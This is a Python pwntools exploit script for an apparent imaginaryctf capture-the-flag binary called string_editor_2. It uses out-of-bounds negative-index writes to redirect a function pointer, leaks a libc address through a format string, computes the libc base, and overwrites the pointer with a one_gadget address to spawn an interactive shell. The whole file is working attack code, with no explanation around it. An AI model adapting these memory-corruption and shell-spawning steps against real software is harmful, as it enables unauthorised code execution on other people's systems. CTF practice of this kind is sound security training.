#!/usr/bin/env python3



from pwn import *


e = ELF("./string_editor_2_patched")
libc = ELF("./libc.so.6")
#r = remote("chal.imaginaryctf.org",42005)
r = process("./string_editor_2_patched")
r.sendafter(b"see utils)",b"-104\n")
r.sendafter(b"index?",b"\x00\n")
r.sendafter(b"see utils)",b"-103\n")
r.sendafter(b"index?",b"\x06\n")
r.sendafter(b"see utils)",b"-102\n")
r.sendafter(b"index?",b"\x40\n")
r.sendafter(b"see utils)",b"-101\n")
r.sendafter(b"index?",b"\x00\n")
r.sendafter(b"see utils)",b"-100\n")
r.sendafter(b"index?",b"\x00\n")
r.sendafter(b"see utils)",b"-99\n")
r.sendafter(b"index?",b"\x00\n")
r.sendafter(b"see utils)",b"14\n")
r.sendafter(b"index?",b"p\n")        
r.sendafter(b"see utils)",b"13\n")
r.sendafter(b"index?",b"$\n")
r.sendafter(b"see utils)",b"12\n")
r.sendafter(b"index?",b"3\n")
r.sendafter(b"see utils)",b"11\n")
r.sendafter(b"index?",b"1\n")
r.sendafter(b"see utils)",b"10\n")
r.sendafter(b"index?",b"%\n")
r.sendafter(b"see utils)",b"15\n")
r.sendafter(b"Exit",b"2\n")
r.recvuntil(b"**********")
libc_leak  = int(r.recvuntil(b"0b3"),16)
libc_base = libc_leak - libc.sym["__libc_start_main"] - 243
system = hex(libc_base + libc.sym["system"])
log.info("The location of system function on libc is " + system)
system = hex(libc_base + 0xe6c81)
val = chr(int(system[-2:],16)) 
r.sendafter(b"see utils)",b"-104\n")
r.sendafter(b"index?",f"{val}\n")
val = chr(int(system[-4:-2],16))
r.sendafter(b"see utils)",b"-103\n")
r.sendafter(b"index?",f"{val}\n")
val = chr(int(system[-6:-4],16))
r.sendafter(b"see utils)",b"-102\n")
r.sendafter(b"index?",f"{val}\n")
val = chr(int(system[-8:-6],16))
r.sendafter(b"see utils)",b"-101\n")
r.sendafter(b"index?",f"{val}\n")
val = chr(int(system[-10:-8],16))
r.sendafter(b"see utils)",b"-100\n")
r.sendafter(b"index?",f"{val}\n")
val = chr(int(system[-12:-10],16))
r.sendafter(b"see utils)",b"-99\n")
r.sendafter(b"index?",f"{val}\n")
r.sendafter(b"see utils)",b"15\n")
r.sendafter(b"Exit",b"2\n")
r.interactive()
